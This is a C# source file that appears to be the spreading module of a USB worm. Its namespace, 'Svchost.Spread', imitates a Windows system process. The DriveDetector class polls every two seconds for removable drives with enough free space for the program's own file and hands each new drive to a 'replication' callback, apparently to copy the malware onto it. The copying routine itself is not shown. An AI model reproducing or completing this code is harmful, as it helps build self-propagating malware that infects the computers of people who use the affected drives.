using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;

namespace Svchost.Spread
{
    class DriveDetector
    {
        private List<string> drives;
        private Action<DriveInfo> replicationCallback;
        private long necessaryFreeSpace;
        private Timer _timer;
        private int checkInterval;
        private bool working;

        public DriveDetector(string assemblyFullName, Action<DriveInfo> replicationCb)
        {
            drives = new List<string>();
            checkInterval = 2;
            replicationCallback = replicationCb;
            working = false;

            try
            {
                FileInfo oFileInfo = new FileInfo(assemblyFullName);
                necessaryFreeSpace = oFileInfo.Length + 1000;
                StartMonitoring();
            }
            catch { return; }
        }

        public void StartMonitoring()
        {
            _timer = new Timer(checkForDrive, null, 5000, checkInterval * 1000);
        }

        public void checkForDrive(object state)
        {
            if (working)
                return;
            working = true;
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                if (drive.DriveType == DriveType.Removable)
                {
                    if(drive.IsReady && drive.AvailableFreeSpace > necessaryFreeSpace)
                    {
                        string driveName = drive.Name + drive.VolumeLabel;
                        if (!drives.Contains(driveName))
                        {
                            replicationCallback(drive);
                            drives.Add(driveName);
                        }
                    }
                }
            }
            working = false;
        }
    }
}
